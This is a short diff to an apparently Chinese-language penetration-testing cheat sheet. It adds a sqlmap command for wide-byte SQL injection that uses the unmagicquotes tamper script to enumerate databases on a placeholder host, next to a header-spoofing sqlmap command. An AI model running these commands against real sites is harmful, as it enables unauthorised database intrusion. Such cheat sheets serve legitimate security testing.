@@ -1545,6 +1545,10 @@ Options:
 ```
 sqlmap --headers="Host:www.baidu.com\nUser-Agent:baidu.com"
 ```
+### sqlmap宽字节注入
+```
+sqlmap -u "https://x.x.x.x/index.php?id=1" --tamper unmagicquotes --dbs
+```
 ### sqlmap Linux MySQL Udf 提权
 
 ```
